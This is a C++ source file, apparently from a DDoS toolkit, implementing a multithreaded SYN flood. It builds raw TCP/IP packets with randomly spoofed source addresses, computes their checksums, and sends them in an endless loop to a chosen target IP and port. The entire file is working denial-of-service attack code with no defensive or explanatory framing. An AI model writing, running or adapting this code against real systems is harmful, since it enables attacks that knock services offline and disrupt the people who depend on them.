//
// Created by mao on 17-12-20.
//

#include <strings.h>
#include <cstring>
#include <iostream>
#include "SYN.h"

SYN::SYN(const arg_bundle &args) : DDosLibrary(args) {

}

void SYN::run() {
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket()");
        return;
    }
    /* 设置IP选项 */
    int on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)) < 0) {
        perror("setsockopt()");
        return;
    }

    struct sockaddr_in addr{};
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(this->args.target_port);
    addr.sin_addr.s_addr = inet_addr(this->args.target_ip);
    srand(static_cast<unsigned int>(time(nullptr)));

    if (this->args.target_ip == nullptr) {
        return;
    }

    for (int i = 0; i < args.thread_num; ++i) {
        std::thread t(&SYN::syn, this, &addr);
        threads.push_back(std::move(t));
    }

    for (int j = 0; j < threads.size(); ++j) {
        threads.at(static_cast<unsigned long>(j)).join();
    }
}

void SYN::syn(struct sockaddr_in *addr) {
    char buf[100], sendbuf[100];
    int len;
    struct ip ip{};            //IP头部
    struct tcphdr tcp{};        //TCP头部
    struct pseudohdr pseudoheader{};    //TCP伪头部


    len = sizeof(struct ip) + sizeof(struct tcphdr);

    /* 初始化头部信息 */
    init_header(&ip, &tcp, &pseudoheader);
    int count = 0;
    while (true) {
        /* 处于活动状态时持续发送SYN包 */
        ip.sourceIP = static_cast<unsigned int>(rand());

        //计算IP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf, &ip, sizeof(struct ip));
        ip.checksum = checksum((u_short *) buf, sizeof(struct ip));

        pseudoheader.saddr = ip.sourceIP;

        //计算TCP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf, &pseudoheader, sizeof(pseudoheader));
        memcpy(buf + sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
        tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader) + sizeof(struct tcphdr));

        bzero(sendbuf, sizeof(sendbuf));
        memcpy(sendbuf, &ip, sizeof(struct ip));
        memcpy(sendbuf + sizeof(struct ip), &tcp, sizeof(struct tcphdr));
        count++;
        std::cout << ".";
        if (count > 10) {
            std::cout.flush();
            count = 0;
        }
        if (sendto(sockfd, sendbuf, static_cast<size_t>(len), 0, reinterpret_cast<const sockaddr *>(addr),
                   sizeof(struct sockaddr)) < 0) {
            perror("sendto()");
            return;
        }
        //sleep(1);
    }
}
